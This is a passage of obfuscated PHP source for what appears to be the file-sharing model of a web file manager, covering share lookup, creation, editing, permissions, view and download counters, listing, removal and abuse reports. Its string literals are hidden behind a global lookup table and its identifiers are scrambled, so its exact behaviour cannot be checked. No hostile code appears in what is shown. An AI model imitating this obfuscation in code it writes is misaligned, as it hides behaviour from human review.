getInfoByHash($şš½ô¼ç) { return $this->_getShareInfo(array($_SERVER[‘ÆÜ‘œ][1506] => $şš½ô¼ç)); } public function getInfoByPath($ÈÄÛ¨÷á) { $ìñ›¹‚æ =& $_SERVER[‘ÆÜ‘œ]; $ïÓ®ë– = array($ìñ›¹‚æ[1544] => USER_ID, $ìñ›¹‚æ[192] => $ÈÄÛ¨÷á); return $this->_getShareInfo($ïÓ®ë–); } public function getInfoBySourcePath($ˆÅ©Ùô) { $ø·ƒÍ„ =& $_SERVER[‘ÆÜ‘œ]; $«üĞ…¢á = array($ø·ƒÍ„[1544] => USER_ID, $ø·ƒÍ„[591] => $ˆÅ©Ùô); return $this->_getShareInfo($«üĞ…¢á); } private function _getShareInfo($”¿Ñ†­ª, $’Ùí† = true) { $º©Ö¹ï =& $_SERVER[‘ÆÜ‘œ]; $ƒÏàç = $this->where($”¿Ñ†­ª)->find(); if (!$ƒÏàç) { return !1; } if (!is_array($ƒÏàç[$º©Ö¹ï[588]])) { $ƒÏàç[$º©Ö¹ï[588]] = array(); } $”¿Ñ†­ª = array($º©Ö¹ï[695] => $ƒÏàç[$º©Ö¹ï[695]]); $òÁÙòñ = $º©Ö¹ï[2279]; $ƒÏàç[$º©Ö¹ï[1502]] = Model($º©Ö¹ï[696])->order($º©Ö¹ï[495])->field($òÁÙòñ)->where($”¿Ñ†­ª)->select(); if (!$’Ùí†) { return $ƒÏàç; } return $this->shareSourceInfo($ƒÏàç); } private function shareSourceInfo($†œÇ¹”) { $Í˜¢¤ğ =& $_SERVER[‘ÆÜ‘œ]; if (!is_array($†œÇ¹”)) { return $†œÇ¹”; } if ($†œÇ¹”[$Í˜¢¤ğ[192]] == $Í˜¢¤ğ[229]) { $†œÇ¹”[$Í˜¢¤ğ[90]] = IO::info($†œÇ¹”[$Í˜¢¤ğ[591]]); } else { $†œÇ¹”[$Í˜¢¤ğ[90]] = Model($Í˜¢¤ğ[1484])->pathInfo($†œÇ¹”[$Í˜¢¤ğ[192]]); } return $†œÇ¹”; } protected function getInfoAuth($…„Ã³Çµ) { $Ü¼ÇúÜ÷ =& $_SERVER[‘ÆÜ‘œ]; $à×ÜŞËŠ = $this->getInfo($…„Ã³Çµ); if ($à×ÜŞËŠ[$Ü¼ÇúÜ÷[1544]] == USER_ID) { $à×ÜŞËŠ[$Ü¼ÇúÜ÷[510]] = $à×ÜŞËŠ[$Ü¼ÇúÜ÷[90]][$Ü¼ÇúÜ÷[510]]; } else { $à×ÜŞËŠ[$Ü¼ÇúÜ÷[510]] = Model($Ü¼ÇúÜ÷[595])->authMake($à×ÜŞËŠ[$Ü¼ÇúÜ÷[1502]]); } return $à×ÜŞËŠ; } protected function listData($¶Áç˜Ü£ = null, $Ç¥¼ÅÃÊ = 300) { $ı§Ö·› =& $_SERVER[‘ÆÜ‘œ]; $Ï¶´°’» = array(array($ı§Ö·›[586] => array($ı§Ö·›[1130], 0), $ı§Ö·›[693] => array($ı§Ö·›[1130], 0), $ı§Ö·›[2280] => $ı§Ö·›[2236])); if ($¶Áç˜Ü£ == $ı§Ö·›[2281]) { $Ï¶´°’» = array($ı§Ö·›[586] => 1); } else { if ($¶Áç˜Ü£ == $ı§Ö·›[1295]) { $Ï¶´°’» = array($ı§Ö·›[693] => 1); } } $Ï¶´°’»[$ı§Ö·›[1544]] = USER_ID; $Ğ®ÜĞº° = $this->where($Ï¶´°’»)->selectPage($Ç¥¼ÅÃÊ); return $Ğ®ÜĞº°; } protected function listToMe($ÖòßŠ‹ = 300) { $ÙÇêÊ™ª =& $_SERVER[‘ÆÜ‘œ]; $ÌâÖµ»¸ = Model($ÙÇêÊ™ª[2282])->userGroupParents(USER_ID); $÷å”·Ø† = array($ÙÇêÊ™ª[678] => SourceModel::TYPE_USER, $ÙÇêÊ™ª[597] => USER_ID); if ($ÌâÖµ»¸) { $÷å”·Ø† = array(array($ÙÇêÊ™ª[678] => SourceModel::TYPE_USER, $ÙÇêÊ™ª[597] => USER_ID), array($ÙÇêÊ™ª[678] => SourceModel::TYPE_GROUP, $ÙÇêÊ™ª[597] => array($ÙÇêÊ™ª[7], $ÌâÖµ»¸)), $ÙÇêÊ™ª[2280] => $ÙÇêÊ™ª[2236]); } $¨¾Ôú­ = Model($ÙÇêÊ™ª[696])->where($÷å”·Ø†)->selectPage($ÖòßŠ‹); $€ş×ÈÂ¡ = array_to_keyvalue_group($¨¾Ôú­[$ÙÇêÊ™ª[455]], $ÙÇêÊ™ª[695]); if (!$€ş×ÈÂ¡) { return $¨¾Ôú­; } $óƒ¶ÜİŸ = $ÙÇêÊ™ª[2283]; $÷å”·Ø† = array($ÙÇêÊ™ª[695] => array($ÙÇêÊ™ª[515], array_keys($€ş×ÈÂ¡))); $º†Äêí× = $this->field($óƒ¶ÜİŸ)->where($÷å”·Ø†)->select(); foreach ($º†Äêí× as $âĞÒ’ß => &$úÓÁŸ…“) { $úÓÁŸ…“[$ÙÇêÊ™ª[1502]] = $€ş×ÈÂ¡[$úÓÁŸ…“[$ÙÇêÊ™ª[695]]]; } unset($úÓÁŸ…“); $—£ÆÄÙº = array($ÙÇêÊ™ª[2284] => $º†Äêí×, $ÙÇêÊ™ª[2285] => $¨¾Ôú­[$ÙÇêÊ™ª[452]]); return $—£ÆÄÙº; } protected function shareAdd($–È›Ôí÷, $„ª›œ¯Ì) { $µº‡…Š® =& $_SERVER[‘ÆÜ‘œ]; $ã²—ßøÉ = $this->_addShareData($–È›Ôí÷, $„ª›œ¯Ì); if (!empty($„ª›œ¯Ì[$µº‡…Š®[2286]])) { $this->_shareAuthSet($ã²—ßøÉ, $„ª›œ¯Ì[$µº‡…Š®[2286]]); } $this->shareEventAdd($–È›Ôí÷, $„ª›œ¯Ì, $µº‡…Š®[2287]); return $ã²—ßøÉ; } protected function shareAddSystem($ó¦Ö˜ä¿, $ßã”æ®ğ) { $»½¢µ£à =& $_SERVER[‘ÆÜ‘œ]; $‡¹×Ô×Ö = $this->_addShareData($ó¦Ö˜ä¿, $ßã”æ®ğ, $»½¢µ£à[190]); $this->_shareAuthSet($‡¹×Ô×Ö, $ßã”æ®ğ[$»½¢µ£à[2286]]); return $‡¹×Ô×Ö; } private function shareEventAdd($×¦÷„¨µ, $õĞÂøÀ, $Ñ­ù×¬² = "\141\144\x64") { $ªÄÅ›»ô =& $_SERVER[‘ÆÜ‘œ]; if (!$×¦÷„¨µ || $×¦÷„¨µ == $ªÄÅ›»ô[229]) { return; } if ($Ñ­ù×¬² == $ªÄÅ›»ô[2287]) { if ($õĞÂøÀ[$ªÄÅ›»ô[586]] == $ªÄÅ›»ô[91]) { Model($ªÄÅ›»ô[663])->eventShare($×¦÷„¨µ, $ªÄÅ›»ô[2288]); } if ($õĞÂøÀ[$ªÄÅ›»ô[693]] == $ªÄÅ›»ô[91]) { Model($ªÄÅ›»ô[663])->eventShare($×¦÷„¨µ, $ªÄÅ›»ô[2289]); } return; } $‘Ç÷‹’õ = $this->getInfoByPath($×¦÷„¨µ); $Û×ŸûÛ = $ªÄÅ›»ô[2290]; if ($‘Ç÷‹’õ[$ªÄÅ›»ô[586]] == $ªÄÅ›»ô[229] && $õĞÂøÀ[$ªÄÅ›»ô[586]] == $ªÄÅ›»ô[91]) { $Û×ŸûÛ = $ªÄÅ›»ô[2288]; } if ($‘Ç÷‹’õ[$ªÄÅ›»ô[586]] == $ªÄÅ›»ô[91] && $õĞÂøÀ[$ªÄÅ›»ô[586]] == $ªÄÅ›»ô[229]) { $Û×ŸûÛ = $ªÄÅ›»ô[2291]; } if ($‘Ç÷‹’õ[$ªÄÅ›»ô[693]] == $ªÄÅ›»ô[229] && $õĞÂøÀ[$ªÄÅ›»ô[693]] == $ªÄÅ›»ô[91]) { $Û×ŸûÛ = $ªÄÅ›»ô[2289]; } if ($‘Ç÷‹’õ[$ªÄÅ›»ô[693]] == $ªÄÅ›»ô[91] && $õĞÂøÀ[$ªÄÅ›»ô[693]] == $ªÄÅ›»ô[229]) { $Û×ŸûÛ = $ªÄÅ›»ô[2292]; } Model($ªÄÅ›»ô[663])->eventShare($×¦÷„¨µ, $Û×ŸûÛ); return; } private function _addShareData($·Û÷ãîË, $ÂÂ¢çÇ¤ = array(), $„£ÑÔÚï = false) { $ó¸„âÚĞ =& $_SERVER[‘ÆÜ‘œ]; $èûÊğ¬¢ = $„£ÑÔÚï == $ó¸„âÚĞ[190] ? 0 : USER_ID; $¤õÊ–½æ = array($ó¸„âÚĞ[514] => $·Û÷ãîË, $ó¸„âÚĞ[1921] => $èûÊğ¬¢); if ($·Û÷ãîË == 0) { $¤õÊ–½æ = array($ó¸„âÚĞ[2293] => $ÂÂ¢çÇ¤[$ó¸„âÚĞ[591]], $ó¸„âÚĞ[1921] => $èûÊğ¬¢); } if ($ šŒàı¨ = $this->where($¤õÊ–½æ)->find()) { return $ šŒàı¨[$ó¸„âÚĞ[695]]; } if ($·Û÷ãîË == 0) { $²°ËâÌ = array($ó¸„âÚĞ[32] => get_path_this($ÂÂ¢çÇ¤[$ó¸„âÚĞ[87]])); } else { $²°ËâÌ = Model($ó¸„âÚĞ[939])->sourceInfo($·Û÷ãîË); if (!$²°ËâÌ) { return !1; } } if (!$ÂÂ¢çÇ¤[$ó¸„âÚĞ[1818]]) { $ÂÂ¢çÇ¤[$ó¸„âÚĞ[1818]] = $²°ËâÌ[$ó¸„âÚĞ[32]]; } $£»»¸¨ = array($ó¸„âÚĞ[1921] => $èûÊğ¬¢, $ó¸„âÚĞ[514] => $·Û÷ãîË, $ó¸„âÚĞ[1818] => $ó¸„âÚĞ[12], $ó¸„âÚĞ[586] => 0, $ó¸„âÚĞ[693] => 0, $ó¸„âÚĞ[591] => $ó¸„âÚĞ[12], $ó¸„âÚĞ[392] => $ó¸„âÚĞ[12], $ó¸„âÚĞ[1004] => $ó¸„âÚĞ[12], $ó¸„âÚĞ[2294] => 0, $ó¸„âÚĞ[2295] => 0, $ó¸„âÚĞ[869] => 0, $ó¸„âÚĞ[588] => $ó¸„âÚĞ[12], $ó¸„âÚĞ[1506] => $ó¸„âÚĞ[12]); $“¤ÒÂõ« = explode($ó¸„âÚĞ[50], $ó¸„âÚĞ[2296]); foreach ($“¤ÒÂõ« as $ûì£‰Ú) { if (!isset($ÂÂ¢çÇ¤[$ûì£‰Ú])) { continue; } $£»»¸¨[$ûì£‰Ú] = $ÂÂ¢çÇ¤[$ûì£‰Ú]; } $šˆáñëÊ = $this->add($£»»¸¨); $óø÷À¬¦ = array($ó¸„âÚĞ[1506] => short_id($šˆáñëÊ)); if ($this->where($óø÷À¬¦)->find()) { $óø÷À¬¦[$ó¸„âÚĞ[1506]] .= $ó¸„âÚĞ[485] . rand_string(2, 3); } $this->where(array($ó¸„âÚĞ[2297] => $šˆáñëÊ))->save($óø÷À¬¦); return $šˆáñëÊ; } private function _shareAuthSet($ÃŒí¯‚², $íš±ÇØ) { $†²¤Ìõê =& $_SERVER[‘ÆÜ‘œ]; if (!is_array($íš±ÇØ)) { return !1; } $Œ‘‚©‚Í = Model($†²¤Ìõê[2245]); $Œ‘‚©‚Í->where(array($†²¤Ìõê[695] => $ÃŒí¯‚²))->delete(); $¿é¹Ó = array(); foreach ($íš±ÇØ as $Õ¿¾°÷˜) { $¥Œ©”Ñ = SourceModel::TYPE_USER; if ($Õ¿¾°÷˜[$†²¤Ìõê[189]] == SourceModel::TYPE_GROUP) { $¥Œ©”Ñ = SourceModel::TYPE_GROUP; } $Ã†îˆåñ = array($†²¤Ìõê[695] => $ÃŒí¯‚², $†²¤Ìõê[189] => $¥Œ©”Ñ, $†²¤Ìõê[597] => intval($Õ¿¾°÷˜[$†²¤Ìõê[597]]), $†²¤Ìõê[1591] => 0, $†²¤Ìõê[2298] => -1); if ($Õ¿¾°÷˜[$†²¤Ìõê[1591]]) { $Ã†îˆåñ[$†²¤Ìõê[1591]] = $Õ¿¾°÷˜[$†²¤Ìõê[1591]]; } else { if ($Õ¿¾°÷˜[$†²¤Ìõê[2298]]) { $Ã†îˆåñ[$†²¤Ìõê[2298]] = $Õ¿¾°÷˜[$†²¤Ìõê[2298]]; } } $¿é¹Ó[] = $Ã†îˆåñ; } return $Œ‘‚©‚Í->addAll($¿é¹Ó, array(), !0); } public function numViewAdd($é´‚¡¡ñ) { $Ï¸€Šñ÷ =& $_SERVER[‘ÆÜ‘œ]; $ñŞ¡¡«× = array($Ï¸€Šñ÷[2297] => $é´‚¡¡ñ); $this->where($ñŞ¡¡«×)->setAdd($Ï¸€Šñ÷[2294]); } public function numDownloadAdd($¿¤«×¾) { $ ¸—åô =& $_SERVER[‘ÆÜ‘œ]; $Ê¶ã¾ªÁ = array($ ¸—åô[2297] => $¿¤«×¾); $this->where($Ê¶ã¾ªÁ)->setAdd($ ¸—åô[2295]); } protected function shareEdit($œÊ›Ö“¿, $ÎìÜÌ¶Ş) { $«“²µ² =& $_SERVER[‘ÆÜ‘œ]; $Ü§²Ÿ‡ = $this->getInfo($œÊ›Ö“¿); if (!$Ü§²Ÿ‡) { return !1; } if ($ÎìÜÌ¶Ş[$«“²µ²[1506]] && $ÎìÜÌ¶Ş[$«“²µ²[586]] == $«“²µ²[91]) { if ($ÎìÜÌ¶Ş[$«“²µ²[1506]] == $Ü§²Ÿ‡[$«“²µ²[1506]]) { unset($ÎìÜÌ¶Ş[$«“²µ²[1506]]); } if ($ÎìÜÌ¶Ş[$«“²µ²[1506]]) { $™ˆ½ïç = $this->where(array($«“²µ²[2299] => $ÎìÜÌ¶Ş[$«“²µ²[1506]]))->find(); if ($™ˆ½ïç) { return !1; } if (!is_array($ÎìÜÌ¶Ş[$«“²µ²[588]])) { $ÎìÜÌ¶Ş[$«“²µ²[588]] = is_array($Ü§²Ÿ‡[$«“²µ²[588]]) ? $Ü§²Ÿ‡[$«“²µ²[588]] : array(); } if (!$ÎìÜÌ¶Ş[$«“²µ²[588]][$«“²µ²[2300]]) { $ÎìÜÌ¶Ş[$«“²µ²[588]][$«“²µ²[2300]] = $Ü§²Ÿ‡[$«“²µ²[1506]]; $ÎìÜÌ¶Ş[$«“²µ²[588]][$«“²µ²[2301]] = $«“²µ²[91]; } } } $this->_checkLinkShare($ÎìÜÌ¶Ş, $Ü§²Ÿ‡); $ë¯°™™Ü = array(); $ÄÃ¯ïÖ = explode($«“²µ²[50], $«“²µ²[2302]); foreach ($ÄÃ¯ïÖ as $ˆŞö»£É) { if (!array_key_exists($ˆŞö»£É, $ÎìÜÌ¶Ş)) { continue; } $ë¯°™™Ü[$ˆŞö»£É] = $ÎìÜÌ¶Ş[$ˆŞö»£É]; } $this->shareEventAdd($Ü§²Ÿ‡[$«“²µ²[192]], $ÎìÜÌ¶Ş, $«“²µ²[1513]); $this->where(array($«“²µ²[2297] => $œÊ›Ö“¿))->save($ë¯°™™Ü); if (isset($ÎìÜÌ¶Ş[$«“²µ²[2286]])) { $this->_shareAuthSet($œÊ›Ö“¿, $ÎìÜÌ¶Ş[$«“²µ²[2286]]); } return !0; } private function _checkLinkShare($‰ÇƒÌ, $ìéè–‚–) { $ãáñ¿ó =& $_SERVER[‘ÆÜ‘œ]; if ($‰ÇƒÌ[$ãáñ¿ó[586]] != $ãáñ¿ó[91]) { return; } $‰ª†¡À = $ìéè–‚–[$ãáñ¿ó[90]][$ãáñ¿ó[192]]; if ($ìéè–‚–[$ãáñ¿ó[90]][$ãáñ¿ó[33]] != $ãáñ¿ó[231]) { $¬¼·ù°Ú = $this->_folderReport($‰ª†¡À); if (!$¬¼·ù°Ú) { return; } show_json(LNG($ãáñ¿ó[2303]) . $ãáñ¿ó[2304] . $¬¼·ù°Ú, !1); } $‹ŒÒá¨¨ = Model($ãáñ¿ó[939])->fileInfoGet($ìéè–‚–[$ãáñ¿ó[90]][$ãáñ¿ó[192]]); if (!$‹ŒÒá¨¨) { return; } $¿Ëä‹… = $this->shareFileMeta($‹ŒÒá¨¨[$ãáñ¿ó[565]]); if (isset($¿Ëä‹…[$ãáñ¿ó[460]]) && $¿Ëä‹…[$ãáñ¿ó[460]] == $ãáñ¿ó[91]) { show_json(LNG($ãáñ¿ó[2305]), !1); } } private function _folderReport($›ŸìÎôú) { $©ˆ „Ûã =& $_SERVER[‘ÆÜ‘œ]; $ôöçÖµ = array($©ˆ „Ûã[565] => array($©ˆ „Ûã[1130], 0), $©ˆ „Ûã[857] => 3); $‘Ö€öçÑ = Model($©ˆ „Ûã[2306])->where($ôöçÖµ)->field($©ˆ „Ûã[565])->select(); if (!$‘Ö€öçÑ) { return !1; } $‘Ö€öçÑ = array_to_keyvalue($‘Ö€öçÑ, $©ˆ „Ûã[12], $©ˆ „Ûã[565]); $ÇÍ™¾¤± = $©ˆ „Ûã[50] . $›ŸìÎôú . $©ˆ „Ûã[50]; $ôöçÖµ = array($©ˆ „Ûã[565] => array($©ˆ „Ûã[7], $‘Ö€öçÑ), $©ˆ „Ûã[612] => array($©ˆ „Ûã[482], "\45{$ÇÍ™¾¤±}\x25"), $©ˆ „Ûã[528] => 0); $õï…¬šè = Model($©ˆ „Ûã[939])->where($ôöçÖµ)->field($©ˆ „Ûã[2307])->find(); if (!$õï…¬šè) { return !1; } $š˜½ü¡Ò = substr($õï…¬šè[$©ˆ „Ûã[612]], strpos($õï…¬šè[$©ˆ „Ûã[612]], $ÇÍ™¾¤±)); $ôöçÖµ = array($©ˆ „Ûã[192] => array($©ˆ „Ûã[7], trim($š˜½ü¡Ò, $©ˆ „Ûã[50]))); $€Õä¦œ¦ = Model($©ˆ „Ûã[939])->where($ôöçÖµ)->field($©ˆ „Ûã[32])->select(); $¯•áÉì³ = array_to_keyvalue($€Õä¦œ¦, $©ˆ „Ûã[12], $©ˆ „Ûã[32]); $¯•áÉì³[] = $õï…¬šè[$©ˆ „Ûã[32]]; return implode($©ˆ „Ûã[8], $¯•áÉì³); } protected function remove($ÆäŠˆˆ®) { $¨­†Şá× =& $_SERVER[‘ÆÜ‘œ]; $İ––Ÿ´Â = is_array($ÆäŠˆˆ®) ? $ÆäŠˆˆ® : array($ÆäŠˆˆ®); for ($â×øãà = 0; $â×øãà < count($İ––Ÿ´Â); $â×øãà++) { $ßû÷¯•€ = $this->getInfo($İ––Ÿ´Â[$â×øãà]); if ($ßû÷¯•€[$¨­†Şá×[693]] == $¨­†Şá×[91]) { Model($¨­†Şá×[663])->eventShare($ßû÷¯•€[$¨­†Şá×[192]], $¨­†Şá×[2292]); } if ($ßû÷¯•€[$¨­†Şá×[586]] == $¨­†Şá×[91]) { Model($¨­†Şá×[663])->eventShare($ßû÷¯•€[$¨­†Şá×[192]], $¨­†Şá×[2291]); } } $¿æß¾âç = array($¨­†Şá×[695] => array($¨­†Şá×[7], $İ––Ÿ´Â)); $’‘‘©‡ = $this->where($¿æß¾âç)->delete(); if ($’‘‘©‡) { Model($¨­†Şá×[696])->where($¿æß¾âç)->delete(); } return $’‘‘©‡; } protected function removeBySource($ªĞˆÈáı) { $±™Å·Æø =& $_SERVER[‘ÆÜ‘œ]; $åìâ¾ºÔ = array($±™Å·Æø[514] => array($±™Å·Æø[515], $ªĞˆÈáı)); $–ë‡µË = $this->field($±™Å·Æø[695])->where($åìâ¾ºÔ)->select(); $ıõ™¶†Ò = array_to_keyvalue($–ë‡µË, $±™Å·Æø[12], $±™Å·Æø[695]); if (!$ıõ™¶†Ò) { return; } foreach ($–ë‡µË as $èÖ™ïŠ€) { $this->cacheFunctionClear($±™Å·Æø[2308], $èÖ™ïŠ€[$±™Å·Æø[695]]); } $åìâ¾ºÔ = array($±™Å·Æø[2297] => array($±™Å·Æø[515], $ıõ™¶†Ò)); $this->where($åìâ¾ºÔ)->delete(); Model($±™Å·Æø[696])->where($åìâ¾ºÔ)->delete(); } public function listAll($Â™”–Ìí) { $ÏİñÅ =& $_SERVER[‘ÆÜ‘œ]; $›“ä”óä = array(); if ($Â™”–Ìí[$ÏİñÅ[1544]]) { $›“ä”óä[$ÏİñÅ[1544]] = $Â™”–Ìí[$ÏİñÅ[1544]]; } if ($Â™”–Ìí[$ÏİñÅ[868]]) { $ñ¶ÎÄŸ = $Â™”–Ìí[$ÏİñÅ[869]] ? $Â™”–Ìí[$ÏİñÅ[869]] : strtotime(date($ÏİñÅ[2309])); $›“ä”óä[$ÏİñÅ[232]] = array($ÏİñÅ[418], array($Â™”–Ìí[$ÏİñÅ[868]], $ñ¶ÎÄŸ)); } if ($Â™”–Ìí[$ÏİñÅ[33]]) { $›“ä”óä[$Â™”–Ìí[$ÏİñÅ[33]]] = 1; } else { $›“ä”óä[] = array($ÏİñÅ[586] => array($ÏİñÅ[1130], 0), $ÏİñÅ[693] => array($ÏİñÅ[1130], 0), $ÏİñÅ[2280] => $ÏİñÅ[2236]); } if ($Â™”–Ìí[$ÏİñÅ[2232]]) { $›“ä”óä[] = array($ÏİñÅ[1506] => $Â™”–Ìí[$ÏİñÅ[2232]], $ÏİñÅ[1818] => array($ÏİñÅ[482], "\45{$Â™”–Ìí[$ÏİñÅ[2232]]}\45"), $ÏİñÅ[2280] => $ÏİñÅ[2236]); } $³ö©§Ì¹ = $this->_makeOrder()->where($›“ä”óä)->selectPage(20); if (empty($³ö©§Ì¹[$ÏİñÅ[455]])) { return array(); } $this->_listDataApply($³ö©§Ì¹[$ÏİñÅ[455]]); return $³ö©§Ì¹; } public function listDataApply($‚ÇÆÊÑÁ) { $this->_listDataApply($‚ÇÆÊÑÁ); return $‚ÇÆÊÑÁ; } private function _listDataApply(&$ëİáàãƒ) { $ëæõÅÒØ =& $_SERVER[‘ÆÜ‘œ]; $ô™–˜¼¿ = array_to_keyvalue($ëİáàãƒ, $ëæõÅÒØ[12], $ëæõÅÒØ[1544]); $ŞØ¡ë‹± = Model($ëæõÅÒØ[625])->userListInfo(array_unique($ô™–˜¼¿)); $éóõ‹ŸÀ = array_to_keyvalue($ëİáàãƒ, $ëæõÅÒØ[12], $ëæõÅÒØ[192]); $…»‘é„Á = Model($ëæõÅÒØ[939])->sourceListInfo($éóõ‹ŸÀ, !0); foreach ($ëİáàãƒ as $ËÀ ´ÅĞ => &$ÔÇãêî) { $¾œ×Ëó¤ = $ÔÇãêî[$ëæõÅÒØ[1544]]; $ÔÇãêî[$ëæõÅÒØ[2310]] = $ŞØ¡ë‹±[$¾œ×Ëó¤] ? $ŞØ¡ë‹±[$¾œ×Ëó¤] : !1; if (!$ÔÇãêî[$ëæõÅÒØ[2310]] || $ÔÇãêî[$ëæõÅÒØ[2310]][$ëæõÅÒØ[857]] != $ëæõÅÒØ[91]) { unset($ëİáàãƒ[$ËÀ ´ÅĞ]); continue; } $Ëã³óş = $ÔÇãêî[$ëæõÅÒØ[192]]; $ÔÇãêî[$ëæõÅÒØ[90]] = $…»‘é„Á[$Ëã³óş] ? $…»‘é„Á[$Ëã³óş] : !1; if ($ÔÇãêî[$ëæõÅÒØ[90]][$ëæõÅÒØ[528]] == $ëæõÅÒØ[91]) { unset($ëİáàãƒ[$ËÀ ´ÅĞ]); } if ($ÔÇãêî[$ëæõÅÒØ[90]] != $ëæõÅÒØ[229] && !$ÔÇãêî[$ëæõÅÒØ[90]]) { unset($ëİáàãƒ[$ËÀ ´ÅĞ]); } } unset($ÔÇãêî); $ëİáàãƒ = array_values($ëİáàãƒ); } private function _makeOrder($õÓè²¶Ï = '') { $çŞÂ°ô‹ =& $_SERVER[‘ÆÜ‘œ]; $»¤÷‹‚ó = array($çŞÂ°ô‹[232], $çŞÂ°ô‹[869], $çŞÂ°ô‹[2294], $çŞÂ°ô‹[2295]); $†¥ÒÉï = array($çŞÂ°ô‹[545] => $çŞÂ°ô‹[546], $çŞÂ°ô‹[547] => $çŞÂ°ô‹[548]); $ÒÌµôèé = Input::get($çŞÂ°ô‹[552], $çŞÂ°ô‹[7], $çŞÂ°ô‹[520], $»¤÷‹‚ó); $£ÄŒ—„î = Input::get($çŞÂ°ô‹[553], $çŞÂ°ô‹[7], $çŞÂ°ô‹[2311], array($çŞÂ°ô‹[2229], $çŞÂ°ô‹[547])); $£ÄŒ—„î = $†¥ÒÉï[$£ÄŒ—„î]; $õÓè²¶Ï = $õÓè²¶Ï . "{$ÒÌµôèé}\40{$£ÄŒ—„î}"; return $this->order($õÓè²¶Ï); } public function reportAdd($şé× ºÊ) { $»„Œò™— =& $_SERVER[‘ÆÜ‘œ]; $ËÌÀ‡µæ = array($»„Œò™—[695] => $şé× ºÊ[$»„Œò™—[695]], $»„Œò™—[1544] => USER_ID); if (Model($»„Œò™—[2306])->where($ËÌÀ‡µæ)->find()) { return !1; } $Ù§Ã…¼ü = array($»„Œò™—[695] => $şé× ºÊ[$»„Œò™—[695]], $»„Œò™—[1818] => $şé× ºÊ[$»„Œò™—[1818]], $»„Œò™—[192] => $şé× ºÊ[$»„Œò™—[192]], $»„Œò™—[565] => $şé× ºÊ[$»„Œò™—[565]], $»„Œò™—[1544] => USER_ID, $»„Œò™—[33] => $şé× ºÊ[$»„Œò™—[33]], $»„Œò™—[548] => $şé× ºÊ[$»„Œò™—[548]]); return Model($»„Œò™—[2306])->add($Ù§Ã…¼ü); } public function reportList($¢ÈŸôôÂ) { $°†¹ëíƒ =& $_SERVER[‘ÆÜ‘œ]; $‡ôë™½” = array(); if ($¢ÈŸôôÂ[$°†¹ëíƒ[868]]) { $Ú¯È²Üª = $¢ÈŸôôÂ[$°†¹ëíƒ[869]] ? $¢ÈŸôôÂ[$°†¹ëíƒ[869]] : strtotime(date($°†¹ëíƒ[2309])); $‡ôë™½”[$°†¹ëíƒ[232]] = array($°†¹ëíƒ[418], array($¢ÈŸôôÂ[$°†¹ëíƒ[868]], $Ú¯È²Üª)); } if (isset($¢ÈŸôôÂ[$°†¹ëíƒ[33]]) && in_array($¢ÈŸôôÂ[$°†¹ëíƒ[33]], array($°†¹ëíƒ[91], $°†¹ëíƒ[532], $°†¹ëíƒ[2312], $°†¹ëíƒ[2313], $°†¹ëíƒ[2314]))) { $‡ôë™½”[$°†¹ëíƒ[33]] = $¢ÈŸôôÂ[$°†¹ëíƒ[33]]; } if (isset($¢ÈŸôôÂ[$°†¹ëíƒ[857]]) && in_array($¢ÈŸôôÂ[$°†¹ëíƒ[857]], array($°†¹ëíƒ[229], $°†¹ëíƒ[91], $°†¹ëíƒ[532], $°†¹ëíƒ[2312]))) { $‡ôë™½”[$°†¹ëíƒ[857]] = $¢ÈŸôôÂ[$°†¹ëíƒ[857]]; } $¦®¶À…¸ = Input::get($°†¹ëíƒ[553], $°†¹ëíƒ[7], $°†¹ëíƒ[2311], array($°†¹ëíƒ[2229], $°†¹ëíƒ[547])); $¬Ïº§¬Î = array($°†¹ëíƒ[545] => $°†¹ëíƒ[546], $°†¹ëíƒ[547] => $°†¹ëíƒ[548]); $ÆõËº¥æ = $°†¹ëíƒ[2315] . $¬Ïº§¬Î[$¦®¶À…¸]; $åÂÍ‘Ÿ¤ = Model($°†¹ëíƒ[2306])->where($‡ôë™½”)->order($ÆõËº¥æ)->selectPage(20); if (empty($åÂÍ‘Ÿ¤[$°†¹ëíƒ[455]])) { return array(); } $ÎŒ®…å´ = array_to_keyvalue_group($åÂÍ‘Ÿ¤[$°†¹ëíƒ[455]], $°†¹ëíƒ[857], $°†¹ëíƒ[695]); if (!empty($ÎŒ®…å´[0])) { $¢ÈŸôôÂ = $ÎŒ®…å´[0]; $‡ôë™½” = array($°†¹ëíƒ[695] => array($°†¹ëíƒ[7], $¢ÈŸôôÂ)); $„ğÙØ® = $this->where($‡ôë™½”)->field($°†¹ëíƒ[695])->select(); $„ğÙØ® = array_to_keyvalue($„ğÙØ®, $°†¹ëíƒ[12], $°†¹ëíƒ[695]); $øÓı§¦· = array_diff($¢ÈŸôôÂ, $„ğÙØ®); if (!empty($øÓı§¦·)) { foreach ($åÂÍ‘Ÿ¤[$°†¹ëíƒ[455]] as $×ïÊ£ÜÑ => $Ã£†°‚) { if (in_array($Ã£†°‚[$°†¹ëíƒ[695]], $øÓı§¦·)) { unset($åÂÍ‘Ÿ¤[$°†¹ëíƒ[455]][$×ïÊ£ÜÑ]); } } } } $this->_listDataApply($åÂÍ‘Ÿ¤[$°†¹ëíƒ[455]]); return $åÂÍ‘Ÿ¤; } public function reportStatus($³Øú¯æ¦) { $ÂäéêÀ— =& $_SERVER[‘ÆÜ‘œ]; $Áƒ—³ = array($ÂäéêÀ—[495] => $³Øú¯æ¦[$ÂäéêÀ—[495]]); $ä‡Šîº = Model($ÂäéêÀ—[2306])->where($Áƒ—³)->field($ÂäéêÀ—[2316])->find(); if (!$ä‡Šîº) { return !1; } $–ûÀÛ†‡ = array($ÂäéêÀ—[857] => $³Øú¯æ¦[$ÂäéêÀ—[857]]); if ($³Øú¯æ¦[$ÂäéêÀ—[857]] == $ÂäéêÀ—[2312] && $ä‡Šîº[$ÂäéêÀ—[857]] == $ÂäéêÀ—[2312]) { $–ûÀÛ†‡[$ÂäéêÀ—[857]] = 0; } $ÁìëØØÀ = Model($ÂäéêÀ—[2306])->where($Áƒ—³)->save($–ûÀÛ†‡); if ($³Øú¯æ¦[$ÂäéêÀ—[857]] == $ÂäéêÀ—[532]) { if ($ä‡Šîº[$ÂäéêÀ—[565]] != $ÂäéêÀ—[229] && $this->shareFileMeta($ä‡Šîº[$ÂäéêÀ—[565]])) { $this->shareFileMeta($ä‡Šîº[$ÂäéêÀ—[565]], 0); } $this->remove($ä‡Šîº[$ÂäéêÀ—[695]]); return !0; } if ($ÁìëØØÀ && $³Øú¯æ¦[$ÂäéêÀ—[857]] == $ÂäéêÀ—[2312]) { $ù Ó§Ó = $–ûÀÛ†‡[$ÂäéêÀ—[857]] == $ÂäéêÀ—[2312] ? 1 : 0; $this->shareFileMeta($ä‡Šîº[$ÂäéêÀ—[565]], $ù Ó§Ó); 